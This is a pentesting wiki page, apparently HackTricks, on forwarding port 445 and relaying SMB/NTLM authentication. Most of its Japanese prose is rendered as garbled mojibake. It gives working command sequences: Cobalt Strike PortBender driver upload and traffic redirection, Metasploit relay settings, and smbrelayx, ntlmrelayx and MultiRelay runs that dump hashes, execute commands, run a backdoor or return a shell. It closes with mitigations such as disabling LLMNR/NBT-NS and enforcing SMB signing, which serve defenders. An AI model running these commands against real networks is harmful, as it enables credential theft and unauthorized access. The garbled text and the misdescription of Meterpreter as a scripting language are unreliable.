### 445ãƒãƒ¼ãƒˆã®è»¢é€ã¨ãƒˆãƒ³ãƒãƒªãƒ³ã‚°

{% hint style="warning" %}
ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã«**ãƒã‚·ãƒ³ã‚’å°å…¥**ã§ãã‚‹å ´åˆã¯ã€ä»¥ä¸‹ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®**ãƒ„ãƒ¼ãƒ«**ã®ã„ãšã‚Œã‹ã‚’ä½¿ç”¨ã—ã¦ãƒªãƒ¬ãƒ¼ã‚¢ã‚¿ãƒƒã‚¯ã‚’å®Ÿè¡Œã—ã€ã“ã‚Œã«ã¤ã„ã¦ã¯å¿ƒé…ã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
{% endhint %}

ãŸã ã—ã€ãƒ¬ãƒƒãƒ‰ãƒãƒ¼ãƒ ã§ã¯é€šå¸¸ã€**Windowsãƒã‚·ãƒ³ã®ãƒãƒ¼ãƒˆ445ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’è‡ªåˆ†ã®ãƒã‚·ãƒ³ã«è»¢é€**ã—ã€æ¬¡ã«ãã®ãƒ„ãƒ¼ãƒ«ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’**ãƒ—ãƒ­ã‚­ã‚·ã‚’ä»‹ã—ã¦ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°**ã—ã¦å†…éƒ¨ã®æ”»æ’ƒå¯¾è±¡ãƒã‚·ãƒ³ã«åˆ°é”ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ãƒ„ãƒ¼ãƒ«[**PortBender**](https://github.com/praetorian-inc/PortBender)ã¯ã€ãƒãƒ¼ãƒˆ**445ã«å‘ã‹ã†ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’åˆ¥ã®ãƒãƒ¼ãƒˆ**(ãŸã¨ãˆã°8445)ã«**ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆ**ã™ã‚‹ãŸã‚ã®ãƒ‰ãƒ©ã‚¤ãƒã§ã™ã€‚ãƒ‰ãƒ©ã‚¤ãƒã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã«ã¯ã€**ãƒ­ãƒ¼ã‚«ãƒ«ç®¡ç†è€…**ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ãŒå¿…è¦ã§ã™ã€‚ã»ã¨ã‚“ã©ã®Windowsãƒ‰ãƒ©ã‚¤ãƒãŒé…ç½®ã•ã‚Œã‚‹å ´æ‰€ã§ã‚ã‚‹`cd C:\Windows\System32\drivers`ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒåˆç†çš„ã§ã™ã€‚
```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Metasploit

Metasploit is a powerful framework used for penetration testing and exploiting vulnerabilities in systems. It provides a wide range of tools and modules that can be used to carry out various hacking techniques. Metasploit allows hackers to identify and exploit vulnerabilities in target systems, gain unauthorized access, and perform post-exploitation activities.

Metasploit is designed to be user-friendly and flexible, making it suitable for both beginners and experienced hackers. It supports multiple platforms and can be used to target various operating systems, applications, and network devices.

The framework includes a comprehensive database of known vulnerabilities, which can be used to search for specific exploits. It also provides a scripting language called "Meterpreter" that allows hackers to automate tasks and create custom exploits.

Metasploit is constantly updated with new exploits and modules, making it a valuable tool for hackers. However, it is important to note that the use of Metasploit for unauthorized activities is illegal and unethical. It should only be used for legitimate purposes, such as penetration testing and securing systems against potential threats.
```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```
### smbrelayx

smbrelayxã¯ã€SMBãƒªãƒ¬ãƒ¼ã‚¢ã‚¿ãƒƒã‚¯ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚ã“ã®ãƒ„ãƒ¼ãƒ«ã¯ã€æ”»æ’ƒè€…ãŒä¸­é–“è€…æ”»æ’ƒã‚’ä½¿ç”¨ã—ã¦ã€SMBã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ãƒªãƒ¬ãƒ¼ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯èªè¨¼æƒ…å ±ã‚’ç›—ã¿å‡ºã—ãŸã‚Šã€ãƒªãƒ¢ãƒ¼ãƒˆã‚·ã‚¹ãƒ†ãƒ ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

smbrelayxã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€æ”»æ’ƒè€…ã¯ä»¥ä¸‹ã®æ‰‹é †ã§æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

1. æ”»æ’ƒè€…ã¯ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã®ãƒ›ã‚¹ãƒˆã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹SMBã‚µãƒ¼ãƒ“ã‚¹ã‚’è¦‹ã¤ã‘ã¾ã™ã€‚
2. æ”»æ’ƒè€…ã¯ã€smbrelayxã‚’ä½¿ç”¨ã—ã¦ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒ›ã‚¹ãƒˆã¨æ”»æ’ƒè€…ã®é–“ã§SMBã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ãƒªãƒ¬ãƒ¼ã—ã¾ã™ã€‚
3. ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒ›ã‚¹ãƒˆã¯ã€æ”»æ’ƒè€…ãŒæä¾›ã™ã‚‹å½ã®SMBã‚µãƒ¼ãƒãƒ¼ã«æ¥ç¶šã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚
4. æ”»æ’ƒè€…ã¯ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒ›ã‚¹ãƒˆã‹ã‚‰é€ä¿¡ã•ã‚ŒãŸèªè¨¼æƒ…å ±ã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã€ãƒªãƒ¢ãƒ¼ãƒˆã‚·ã‚¹ãƒ†ãƒ ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

smbrelayxã¯ã€ä¸­é–“è€…æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®å¼·åŠ›ãªãƒ„ãƒ¼ãƒ«ã§ã™ãŒã€æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ã‚‚ã‚ã‚‹ãŸã‚ã€æ­£å½“ãªç›®çš„ã§ã®ã¿ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚
```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```
### MultiRelay

**MultiRelay**ã‚’ä½¿ç”¨ã—ãŸã„å ´åˆã¯ã€_**/usr/share/responder/tools**_ã«ç§»å‹•ã—ã€MultiRelay (`-t <IP target> -u <User>`)ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚
```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```
![](<../../.gitbook/assets/image (209).png>)

### NTLMãƒ­ã‚°ã‚¤ãƒ³ã®å¼·åˆ¶

Windowsã§ã¯ã€ç‰¹æ¨©ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä»»æ„ã®ãƒã‚·ãƒ³ã«èªè¨¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’èª­ã‚“ã§è©³ç´°ã‚’å­¦ã³ã¾ã—ã‚‡ã†ã€‚

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## è§£æ±ºç­–

### LLMNRã®ç„¡åŠ¹åŒ–

DNSã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã§LLMNRã‚’ç„¡åŠ¹ã«ã™ã‚‹ã«ã¯ã€gpedit.mscã‚’é–‹ãã¾ã™ã€‚\
ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã®æ§‹æˆ->ç®¡ç†ç”¨ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ->ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯->DNSã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«ç§»å‹•ã—ã¾ã™ã€‚\
ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã€Œãƒãƒ«ãƒã‚­ãƒ£ã‚¹ãƒˆåè§£æ±ºã‚’ç„¡åŠ¹ã«ã™ã‚‹ã€ã‚’è¦‹ã¤ã‘ã€[ãƒãƒªã‚·ãƒ¼è¨­å®š]ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚

![](../../.gitbook/assets/1.jpg)

æ–°ã—ã„ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ãŒé–‹ã„ãŸã‚‰ã€ã“ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æœ‰åŠ¹ã«ã—ã€[é©ç”¨]ã‚’æŠ¼ã—ã¦[OK]ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚

![](../../.gitbook/assets/2.jpg)

### NBT-NSã®ç„¡åŠ¹åŒ–

NBT-NSã‚’ç„¡åŠ¹ã«ã™ã‚‹æ–¹æ³•ã®1ã¤ã¯ã€DHCPã‚¹ã‚³ãƒ¼ãƒ—ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚

Microsoftã®DHCPã‚µãƒ¼ãƒãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€NBT-NSã‚’ç„¡åŠ¹ã«ã™ã‚‹ã‚¹ã‚³ãƒ¼ãƒ—ã‚’é¸æŠã—ã¾ã™ã€‚[ã‚¹ã‚³ãƒ¼ãƒ—ã‚ªãƒ—ã‚·ãƒ§ãƒ³]ã‚’å³ã‚¯ãƒªãƒƒã‚¯ã—ã€[ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®æ§‹æˆ]ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚ä»¥ä¸‹ã®ä¾‹ã§ã¯ã€NBT-NSã‚’ç„¡åŠ¹ã«ã—ãŸã„DHCPã‚¹ã‚³ãƒ¼ãƒ—ã¯192.168.1.100ã§ã™ã€‚

![](../../.gitbook/assets/3.jpg)

ã‚¹ã‚³ãƒ¼ãƒ—ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã§ã€[è©³ç´°]ã‚¿ãƒ–ã«ç§»å‹•ã—ã€ãƒ‰ãƒ­ãƒƒãƒ—ãƒ€ã‚¦ãƒ³ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚’ã€ŒMicrosoft Windows 2000ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã€ã«å¤‰æ›´ã—ã¾ã™ã€‚

![](../../.gitbook/assets/4.jpg)

ãƒªã‚¹ãƒˆã‹ã‚‰ã€Œ001 Microsoft Disable Netbios Optionã€ã‚’é¸æŠã—ã€ãã®å€¤ã‚’ã€Œ0x2ã€ã«å¤‰æ›´ã—ã€[é©ç”¨]ã€[OK]ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚

![](../../.gitbook/assets/5.jpg)

### WPAD

WPADæ”»æ’ƒã«å¯¾æŠ—ã™ã‚‹ãŸã‚ã«ã€DNSã‚¾ãƒ¼ãƒ³ã«ã€Œwpadã€ã®ã‚¨ãƒ³ãƒˆãƒªã‚’è¿½åŠ ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚DNSã‚¨ãƒ³ãƒˆãƒªã¯æœ‰åŠ¹ãªWPADã‚µãƒ¼ãƒãƒ¼ã‚’æŒ‡ã™å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã‚¯ã‚¨ãƒªãŒè§£æ±ºã•ã‚Œã‚‹é™ã‚Šã€æ”»æ’ƒã¯é˜²æ­¢ã•ã‚Œã¾ã™ã€‚

### ãƒãƒ«ãƒãƒªãƒ¬ãƒ¼

1\. **ã™ã¹ã¦ã®ãƒ­ãƒ¼ã‚«ãƒ«Windowsãƒã‚·ãƒ³ã§SMBç½²åã‚’å¼·åˆ¶ã™ã‚‹**ã€‚ã“ã®è¨­å®šã«ã‚ˆã‚Šã€ã™ã¹ã¦ã®SMBã‚»ãƒƒã‚·ãƒ§ãƒ³ã«ãƒ‡ã‚¸ã‚¿ãƒ«ç½²åãŒä»˜ã‘ã‚‰ã‚Œã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¨ã‚µãƒ¼ãƒãƒ¼ã¯ãƒ‘ã‚±ãƒƒãƒˆã®é€ä¿¡å…ƒã‚’ç¢ºèªã—ã¦ã‹ã‚‰ç¶šè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®è¨­å®šã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ã§ã®ã¿æœ‰åŠ¹ã«ãªã£ã¦ã„ã¾ã™ã€‚Microsoftã®ä»¥ä¸‹ã®è¨˜äº‹ã§ã¯ã€ã“ã‚Œã‚‰ã®è¨­å®šï¼ˆã‚°ãƒ«ãƒ¼ãƒ—ãƒãƒªã‚·ãƒ¼ã‚’ä»‹ã—ã¦æœ‰åŠ¹ã«ã§ãã‚‹ï¼‰ã¨ãã®å®Ÿè£…æ–¹æ³•ã«ã¤ã„ã¦è©³ã—ãèª¬æ˜ã—ã¦ã„ã¾ã™ã€‚

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. **ãƒ­ãƒ¼ã‚«ãƒ«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå¿…è¦ãªãƒã‚·ãƒ³ã«ã®ã¿ãƒªãƒ¢ãƒ¼ãƒˆãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ã‚ˆã†ã«ç¢ºèªã™ã‚‹**ã€‚ä¾‹ãˆã°ã€Sallyã¯Sallyã®ãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã«ã®ã¿ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚ã‚‚ã—æ”»æ’ƒè€…ãŒSallyã®SMBèªè¨¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’å‚å—ã—ãŸå ´åˆã€ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä»–ã®ãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã«ä¸­ç¶™ã™ã‚‹ã“ã¨ã¯ã§ããšã€ã“ã®æ–¹æ³•ã¯ç„¡åŠ¹ã«ãªã‚Šã¾ã™ã€‚

3\. **ãƒ­ãƒ¼ã‚«ãƒ«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã§ã®NTLMèªè¨¼ã‚’å¯èƒ½ãªé™ã‚Šåˆ¶é™ã™ã‚‹**ã€‚ã“ã®æ”»æ’ƒã¯Kerberosèªè¨¼ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ãŒã§ããªã„ãŸã‚ã€NTLMã®ç™ºç”Ÿé‡ã‚’åˆ¶é™ã™ã‚‹ã“ã¨ã§ã“ã®æ”»æ’ƒã‚’å¤§å¹…ã«é˜»æ­¢ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚Microsoftã«ã¯ã“ã‚Œã‚’å®Ÿç¾ã™ã‚‹ãŸã‚ã®æƒ…å ±ãŒã‚ã‚Šã¾ã™ãŒã€æ³¨æ„ãŒå¿…è¦ã§ã™ã€‚ã‚‚ã—ä½•ã‚‰ã‹ã®ç†ç”±ã§Kerberosèªè¨¼ãŒå¤±æ•—ã—ãŸå ´åˆã€é€šå¸¸ã¯NTLMã«ãƒ•ã‚©ãƒ¼ãƒ«ãƒãƒƒã‚¯ã—ã¾ã™ã€‚å®Œå…¨ã«ç„¡åŠ¹ã«ã™ã‚‹ã¨ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãŒåœæ­¢ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

4\. **ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ä¸æ­£ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’é˜²æ­¢ã™ã‚‹**ã€‚ã‚¤ãƒ³ã‚µã‚¤ãƒ€ãƒ¼ã®è„…å¨ã¯ãŠãã‚‰ãSMBãƒªãƒ¬ãƒ¼ã‚¢ã‚¿ãƒƒã‚¯ã‚’åˆ©ç”¨ã—ãªã„ã§ã—ã‚‡ã†ã€‚ãªãœãªã‚‰ã€æ—¢ã«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®è³‡æ ¼æƒ…å ±ã‚’æŒã£ã¦ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚ç‰©ç†çš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼ã‚’å¼·åŒ–ã—ã€ACLã¨MACãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã«ã‚ˆã£ã¦ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ä¸æ­£ãªãƒ‡ãƒã‚¤ã‚¹ã‚’é˜²æ­¢ã—ã€é©åˆ‡ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚»ã‚°ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ç¢ºä¿ã™ã‚‹ã“ã¨ã§ã€ã“ã®æ”»æ’ƒã®è„…å¨ã‚’å¤§å¹…ã«åˆ¶é™ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [**https://intrinium.com/smb-relay-attack-tutorial/**](https://intrinium.com/smb-relay-attack-tutorial/)
* **ç”»åƒã®å‡ºå…¸:**\
[https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)\
[https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)\
[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)\
[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ HackTricksã§ã‚ãªãŸã®ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã‚Šã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[NFT](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/
